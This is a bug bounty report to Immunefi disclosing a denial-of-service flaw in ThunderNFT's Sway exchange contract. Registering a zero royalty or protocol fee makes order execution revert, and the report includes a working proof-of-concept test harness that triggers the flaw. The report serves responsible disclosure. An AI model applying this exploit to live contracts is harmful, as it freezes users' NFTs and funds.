# IOP \_ ThunderNFT 34966 - \[Smart Contract - High] Royalty or protocol fee of will DoS executing order

Submitted on Mon Sep 02 2024 00:01:57 GMT-0400 (Atlantic Standard Time) by @SimaoAmaro for [IOP | ThunderNFT](https://immunefi.com/bounty/thundernft-iop/)

Report ID: #34966

Report type: Smart Contract

Report severity: High

Target: <https://github.com/ThunderFuel/smart-contracts/tree/main/contracts-v1/thunder\\_exchange>

Impacts:

* Temporary freezing of NFTs for at least 1 hour
* Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro

In the `ThunderExchange` when executing an order, a royalty fee and/or a protocol fee is charged on the buyer of the nft. When the fee is 0, it reverts due to calling `transfer()` with a null amount.

## Vulnerability Details

`ThunderExchange::_transfer_fees_and_funds()` and `ThunderExchange::_transfer_fees_and_funds_with_pool()` calculate the protocol fee and royalty fee and transfer this amount to the corresponding addresses.

However, if these fees are set to `0`, but the royalty info has been registered or the `protocol_fee_recipient` has been set, it will revert due to trying to transfer an amount of 0.

## Impact Details

Executing orders will be DoSed until the royalty owner or the protocol increases the fee (it can not be deregistered nor the owner can be set no none).

## References

<https://github.com/ThunderFuel/smart-contracts/blob/main/contracts-v1/thunder\\_exchange/src/main.sw>

## Proof of concept

## Proof of Concept

To run a proof of concept, the exchange was modified to allow a maker of type Contract, as Sway tests do not support pranking an EOA.

Additionally, 3 new contracts were created, one user contract simulating a user placing an order and being the owner of a collection, another user contract simulating a user executing the order and a erc1155 contract, simulating an erc1155 token.

The full changes were pushed to a github repository which can be shared with the team if requested.

The main test file is the following:

```sway
contract;

 use interfaces::{
    thunder_exchange_interface::{ThunderExchange},
    royalty_manager_interface::*,
    asset_manager_interface::*,
    execution_manager_interface::ExecutionManager,
    execution_strategy_interface::*,
    pool_interface::Pool,
    ownable_interface::*,
};

use libraries::{
    msg_sender_address::*,
    constants::*,
    order_types::*,
    ownable::*,
};

use std::{
    block::timestamp,
    auth::*,
    call_frames::*,
    context::*,
    contract_id::ContractId,
    logging::log,
    revert::require,
    storage::storage_map::*,
    asset::*
};

abi Erc1155 {
    #[storage(read, write)]
    fn constructor(owner: Identity);

    #[storage(read, write)]
    fn mint(recipient: Identity, sub_id: SubId, amount: u64);

    #[payable]
    #[storage(read, write)]
    fn burn(sub_id: SubId, amount: u64);
}

abi User {
    fn place_order(thunder_exchange_contract: ContractId, maker_order_input: MakerOrderInput);
    fn execute_order(thunder_exchange_contract: ContractId, order: TakerOrder, payment_asset: AssetId);
    fn register_royalty_info(royalty_manager: ContractId, collection: ContractId, receiver: Identity, fee: u64);
}

#[test()]
fn test_attack() {
    initialize_functions();

    call_attack();
}

fn initialize_functions() {
    //initialize all contracts 

    let thunder_exch = abi(ThunderExchange, thunder_exchange::CONTRACT_ID);
    thunder_exch.initialize();

    let asset_mngr = abi(AssetManager, asset_manager::CONTRACT_ID);
    asset_mngr.initialize();

    // required for initialize below contracts
    let exchange_contract_id = ContractId::from(thunder_exchange::CONTRACT_ID);

    let asset_manger_contract_id = ContractId::from(asset_manager::CONTRACT_ID);

    let fixed_strategy = abi(ExecutionStrategy, strategy_fixed_price_sale::CONTRACT_ID);
    fixed_strategy.initialize(exchange_contract_id);

    let execution_manager = abi(ExecutionManager, execution_manager::CONTRACT_ID);
    execution_manager.initialize();

    let royalty_manager = abi(RoyaltyManager, royalty_manager::CONTRACT_ID);
    royalty_manager.initialize();

    let pool = abi(Pool, pool::CONTRACT_ID);
    pool.initialize(exchange_contract_id, asset_manger_contract_id);

    let erc1155 = abi(Erc1155, erc1155::CONTRACT_ID);
    erc1155.constructor(Identity::ContractId(ContractId::from(user::CONTRACT_ID)));

    let execution_manager = abi(ExecutionManager, execution_manager::CONTRACT_ID);
    execution_manager.add_strategy(ContractId::from(strategy_fixed_price_sale::CONTRACT_ID));

    let asset_manager = abi(AssetManager, asset_manager::CONTRACT_ID);
    asset_manager.add_asset(AssetId::new(ContractId::from(erc1155::CONTRACT_ID), SubId::zero()));

    thunder_exch.set_execution_manager(ContractId::from(execution_manager::CONTRACT_ID));
    thunder_exch.set_asset_manager(ContractId::from(asset_manager::CONTRACT_ID));
    thunder_exch.set_royalty_manager(ContractId::from(royalty_manager::CONTRACT_ID));

    royalty_manager.set_royalty_fee_limit(1000);
}

fn call_attack() {
    let thunder_exchange = ContractId::from(thunder_exchange::CONTRACT_ID);
    let strategy = ContractId::from(strategy_fixed_price_sale::CONTRACT_ID);
    let erc1155_contract = ContractId::from(erc1155::CONTRACT_ID);

    let erc1155 = abi(Erc1155, erc1155::CONTRACT_ID);
    let royalty_manager = abi(RoyaltyManager, royalty_manager::CONTRACT_ID);

    let user = abi(User, user::CONTRACT_ID);
    let user2 = abi(User, user2::CONTRACT_ID);

    user.register_royalty_info(
        ContractId::from(royalty_manager::CONTRACT_ID), 
        erc1155_contract, 
        Identity::ContractId(ContractId::from(user::CONTRACT_ID)), 
        0 // replace by 1000 or similar and it works
    );

    let sub_id = 0x0000000000000000000000000000000000000000000000000000000000000001;

    erc1155.mint(Identity::ContractId(ContractId::from(user::CONTRACT_ID)), sub_id, 1);

    let payment_asset = AssetId::new(erc1155_contract, SubId::zero());
    let erc1155_asset = AssetId::new(erc1155_contract, sub_id);
    let erc1155_amount = 1;
    let price = 1000;

    let maker_order = MakerOrderInput {
        side: Side::Sell,
        maker: Identity::ContractId(ContractId::from(user::CONTRACT_ID)),
        collection: erc1155_contract,
        token_id: sub_id,
        price: price,
        amount: erc1155_amount,
        nonce: 1,
        strategy: strategy,
        payment_asset: payment_asset,
        expiration_range: 100,
        extra_params: ExtraParams {
            extra_address_param: Address::zero(),
            extra_contract_param: ContractId::zero(),
            extra_u64_param: 0,
        },
    };

    user.place_order(thunder_exchange, maker_order);

    let taker_order = TakerOrder {
        side: Side::Buy,
        taker: Identity::ContractId(ContractId::from(user2::CONTRACT_ID)),
        maker: Identity::ContractId(ContractId::from(user::CONTRACT_ID)),
        nonce: 1,
        price: price,
        token_id: sub_id,
        collection: erc1155_contract,
        strategy: strategy,
        extra_params: ExtraParams {
            extra_address_param: Address::zero(),
            extra_contract_param: ContractId::zero(),
            extra_u64_param: 0,
        },
    };

    erc1155.mint(Identity::ContractId(ContractId::from(user2::CONTRACT_ID)), SubId::zero(), price);

    user2.execute_order(thunder_exchange, taker_order, payment_asset);

    assert(balance_of(ContractId::from(user2::CONTRACT_ID), erc1155_asset) == 1);
}
```

The user contract placing the order and registering the royalty is:

```sway
contract;

use interfaces::{
    thunder_exchange_interface::{ThunderExchange},
    royalty_manager_interface::*,
};

use libraries::{
    order_types::*,
};

abi User {
    fn place_order(thunder_exchange_contract: ContractId, maker_order_input: MakerOrderInput);
    fn register_royalty_info(royalty_manager: ContractId, collection: ContractId, receiver: Identity, fee: u64);
}

impl User for Contract {
    fn place_order(thunder_exchange_contract: ContractId, maker_order_input: MakerOrderInput) {
        let thunder_exchange = abi(ThunderExchange, thunder_exchange_contract.into());
        let asset_id = AssetId::new(maker_order_input.collection, maker_order_input.token_id);
        thunder_exchange.place_order{asset_id: asset_id.bits(), coins: maker_order_input.amount}(maker_order_input);
    }

    fn register_royalty_info(royalty_manager: ContractId, collection: ContractId, receiver: Identity, fee: u64) {
        let royalty_manager = abi(RoyaltyManager, royalty_manager.into());
        royalty_manager.register_royalty_info(collection, receiver, fee);
    }
}
```

The user contract executing the order is:

```sway
contract;

use interfaces::{
    thunder_exchange_interface::{ThunderExchange},
};

use libraries::{
    order_types::*,
};

abi User {
    fn execute_order(thunder_exchange_contract: ContractId, order: TakerOrder, payment_asset: AssetId);
}

impl User for Contract {
    fn execute_order(thunder_exchange_contract: ContractId, order: TakerOrder, payment_asset: AssetId) {
        let thunder_exchange = abi(ThunderExchange, thunder_exchange_contract.into());
        thunder_exchange.execute_order{asset_id: payment_asset.bits(), coins: order.price}(order);
    }
}
```
